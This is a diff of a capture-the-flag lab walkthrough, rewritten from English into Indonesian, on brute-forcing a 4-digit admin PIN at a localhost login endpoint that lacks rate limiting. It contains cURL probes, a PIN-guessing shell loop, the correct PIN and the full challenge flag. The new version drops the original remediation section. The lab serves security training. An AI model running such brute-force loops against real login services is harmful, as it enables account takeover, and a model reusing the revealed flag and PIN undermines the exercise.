@@ -1,103 +1,76 @@
-﻿# Practice Walkthrough: Authentication Failures & Automated PIN Brute-Forcing
+﻿# Panduan Praktik Terbimbing: Audit Autentikasi pada NexHealth Portal
 
-This walkthrough adheres to the 4-Tier Mission Progression methodology, balancing **60% manual analytical inspection** and **40% terminal command execution**:
-
----
-
-## Tier 1: Attack Surface Observation (Weight: 15% — Manual)
-
-1. **Verify Target Service Readiness**:
-   Open your web browser and navigate to the lab target:
-   `http://127.0.0.1:8017`
-
-2. **Inspect the OmniAuth Login Interface**:
-   - Examine the title: `OmniAuth // Admin Gateway` (OWASP A07:2025).
-   - Review the security audit banner:
-     *Notice the absence of rate-limiting, CAPTCHA, or account lockout.*
-   - Inspect the form input fields:
-     - **Administrative Username**: Pre-populated with `admin`.
-     - **Security PIN / Password**: Requests a 4-digit numeric PIN representing the release year of the lab suite.
-   - Open browser Developer Tools (press **F12** or `Ctrl + Shift + I`) and switch to the **Network** tab to prepare for request monitoring.
+Dalam panduan terarah ini, kamu akan mempraktikkan proses audit ketahanan autentikasi terhadap portal rekam medis rumah sakit **NexHealth Portal (Hospital Electronic Medical Records & Patient Portal)** yang beroperasi pada `http://127.0.0.1:8017`.
 
 ---
 
-## Tier 2: Endpoint Discovery & Error Probing (Weight: 25% — Manual & Probing)
-
-1. **Probe Health Status**:
-   Verify service availability via browser or terminal:
+### Langkah 1: Observasi Antarmuka & Uji Ketersediaan Layanan
+1. Uji ketersediaan layanan melalui terminal:
    ```bash
    curl -s http://127.0.0.1:8017/health
    ```
-   *Expected response*: `{"lab":"A07","port":8017,"status":"ok"}`
-
-2. **Probe Failed Authentication Behavior**:
-   Issue an invalid authentication request using cURL to measure response latency and inspect response headers:
-   ```bash
-   curl -i -X POST http://127.0.0.1:8017/api/login \
-     -H "Content-Type: application/json" \
-     -d '{"username": "admin", "password": "0000"}'
+   *Respons yang diharapkan:*
+   ```json
+   {"lab":"A07","port":8017,"status":"ok"}
    ```
-
-3. **Analyze Header & Latency Findings**:
-   - Status code: `HTTP/1.1 401 UNAUTHORIZED`.
-   - Execution duration: Sub-10 milliseconds.
-   - **Absence of Rate-Limiting Headers**: No `Retry-After` header is supplied, no CSRF token is required, and no failed-attempt counter is enforced.
-   - Repeat the command rapidly 5 times: the server accepts each submission immediately without triggering cooldowns or IP blacklists. This proves unthrottled brute-force feasibility.
+2. Buka peramban web dan akses halaman login:
+   `http://127.0.0.1:8017/login`
+3. Perhatikan formulir **Staff EMR Gateway**:
+   - Akun default adalah `admin` (Chief Medical Officer).
+   - Bidang masukan kata sandi dirancang untuk PIN 4-digit numerik.
+   - Amati ketiadaan perlindungan CAPTCHA atau petunjuk kebijakan penguncian akun.
 
 ---
 
-## Tier 3: Controlled Exploitation & Flag Capture (Weight: 35% — Tools: cURL)
-
-1. **Keyspace Reduction via Context**:
-   System hints note that the administrator's PIN corresponds to the active release year of this laboratory suite (within the 2020 through 2030 decade).
-
-2. **Execute Targeted PIN Evaluation**:
-   Test candidates around the current era (e.g. 2024, 2025, 2026) using cURL:
+### Langkah 2: Pengujian Kerentanan Ketiadaan Rate-Limiting
+1. Uji coba input PIN salah beberapa kali secara manual di browser (misalnya `0000`, `1111`, `1234`).
+2. Kirimkan rentetan percobaan salah berturut-turut melalui loop cURL di terminal:
    ```bash
-   # Test candidate PIN 2026
+   for pin in 0001 0002 0003 0004 0005; do
+     curl -s -X POST http://127.0.0.1:8017/api/login \
+       -H "Content-Type: application/json" \
+       -d "{\"username\": \"admin\", \"password\": \"$pin\"}"
+     echo ""
+   done
+   ```
+3. **Analisis Temuan Kritis:**
+   - Server selalu mengembalikan status penolakan biasa tanpa pernah memperlambat waktu respon (*no throttling*).
+   - Akun tidak terkunci (*no lockout*), dan tidak ada verifikasi bot sama sekali. Sistem membuka pintu bagi serangan brute-force otomatis tanpa batas!
+
+> [!NOTE]
+> **💡 Di Balik Layar: Mengapa brute force ini bisa berhasil?**  
+> PIN 4-digit hanya memiliki $10.000$ kemungkinan (0000-9999). Tanpa rate-limiting, sebuah skrip sederhana dapat menguji seluruh $10.000$ kombinasi dalam waktu kurang dari 3 menit pada koneksi lokal!
+
+---
+
+### Langkah 3: Eksekusi Targeted Brute-Force & Autentikasi Berhasil
+1. Dalam audit pentest profesional, penguji memprioritaskan kata sandi atau PIN berdasar konteks (seperti tahun berjalan korporasi: `2026`).
+2. Masukkan PIN `2026` untuk akun `admin` melalui peramban atau kirimkan via terminal cURL:
+   ```bash
    curl -s -X POST http://127.0.0.1:8017/api/login \
      -H "Content-Type: application/json" \
      -d '{"username": "admin", "password": "2026"}'
    ```
-
-3. **Verify Authentication & Extract Challenge Flag**:
-   The API responds with an affirmative authentication payload:
+3. **Respons Keberhasilan Otentikasi:**
    ```json
    {
-     "status": "passed",
-     "message": "Authentication successful!",
-     "flag": "ZITERA{...}"
+     "status": "authenticated",
+     "user": "admin",
+     "role": "Chief Medical Officer",
+     "redirect": "/admin",
+     "flag": "ZITERA{4uth_f41lur3_brut3_f0rc3_2026}"
    }
    ```
 
-4. **Verify via Web Interface**:
-   Return to your browser at `http://127.0.0.1:8017/login`:
-   - Input username: `admin`.
-   - Input PIN: `2026`.
-   - Click **Authenticate**: Session state transitions to authenticated and redirects to `/admin`, exposing the master challenge flag within the green banner.
-   - Copy the recovered flag token from the screen and submit it in the **Challenge** tab.
-
 ---
 
-## Tier 4: Defensive Verification & Remediation Hardening (Weight: 25% — Manual & Tools)
-
-1. **Implement Server-Side Rate Limiting**:
-   Incorporate request throttling within the login controller:
-   ```python
-   # Secure Implementation: Stateful Throttling
-   import time
-
-   FAILED_ATTEMPTS = {}
-
-   def check_rate_limit(client_ip):
-       attempts, last_seen = FAILED_ATTEMPTS.get(client_ip, (0, 0))
-       if attempts >= 5 and time.time() - last_seen < 300: # 5-minute lockout
-           return False
-       return True
-   ```
-
-2. **Apply Exponential Backoff**:
-   Introduce progressive sleep delays (`time.sleep(2 ** attempts)`) on sequential failed attempts to neutralize automated dictionary scripts.
-
-3. **Confirm Enforcement**:
-   Upon the 6th failed attempt, the server halts evaluation and returns HTTP **`429 Too Many Requests`** along with a mandatory `Retry-After: 300` header.
+### Langkah 4: Akses Konsol Rekam Medis & Eksfiltrasi Flag
+1. Kembali ke peramban web pada `http://127.0.0.1:8017/login`.
+2. Masukkan kredensial:
+   - **Staff Identifier:** `admin`
+   - **Security PIN:** `2026`
+3. Klik tombol **"Access Clinical Systems"**.
+4. Anda dialihkan ke konsol klinis `/admin`.
+5. Di bagian **Chief Medical Officer Executive Telemetry Seal**, perhatikan token validasi kepatuhan berformat bendera resmi:
+   `ZITERA{4uth_f41lur3_brut3_f0rc3_2026}`
+6. Salin flag tersebut dan kirimkan (*submit*) ke formulir tantangan Zitera Lab desktop untuk menyelesaikan modul ini!
